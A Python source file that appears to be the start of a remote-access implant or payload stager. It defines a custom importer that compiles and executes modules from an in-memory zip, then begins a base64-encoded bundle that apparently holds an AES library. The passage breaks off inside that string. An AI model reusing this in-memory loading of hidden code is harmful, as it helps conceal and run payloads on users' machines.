#!/usr/bin/python
import binascii
import code
import imp
import io
import os
import platform
import random
import re
import select
import socket
import struct
import subprocess
import sys
import threading
import time
import traceback
import base64

try:
    import ctypes
except ImportError:
    has_windll = False
else:
    has_windll = hasattr(ctypes, 'windll')

_search_order = [('.py', False), ('/__init__.py', True)]

class ZipImportError(ImportError):
    pass

class CFinder(object):
    def __init__(self, repoName, content):
        self.repoName = repoName
        self.content = content

    def _get_info(self, repoName, fullname):
        parts = fullname.split('.')
        submodule = parts[-1]
        modulepath = '/'.join(parts)

        #check to see if that specific module exists

        for suffix, is_package in _search_order:
            relpath = modulepath + suffix
            try:
                self.content.getinfo(relpath)
            except KeyError:
                pass
            else:
                return submodule, is_package, relpath

        #Error out if we can find the module/package
        msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
        raise ZipImportError(msg)

    def _get_source(self, repoName, fullname):
        submodule, is_package, relpath = self._get_info(repoName, fullname)
        fullpath = '%s/%s' % (repoName, relpath)
        source = self.content.read(relpath).decode('UTF-8')
        source = source.replace('\r\n', '\n')
        source = source.replace('\r', '\n')
        return submodule, is_package, fullpath, source

    def find_module(self, fullname, path=None):
        try:
            submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        except ImportError:
            return None
        else:
            return self

    def load_module(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
        code = compile(source, fullpath, 'exec')
        mod = sys.modules.setdefault(fullname, imp.new_module(fullname))
        mod.__loader__ = self
        mod.__file__ = fullpath
        mod.__name__ = fullname
        if is_package:
            mod.__path__ = [os.path.dirname(mod.__file__)]
        exec(code) in mod.__dict__
        return mod

    def get_data(self, fullpath):
        prefix = os.path.join(self.repoName, '')
        if not fullpath.startswith(prefix):
            raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
        relpath = fullpath[len(prefix):]
        try:
            return self.content.read(relpath)
        except KeyError:
            raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

    def is_package(self, fullname):
        submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        return is_package

    def get_code(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
        return compile(source, fullpath, 'exec')


try:
    cryptolib=base64.b64decode('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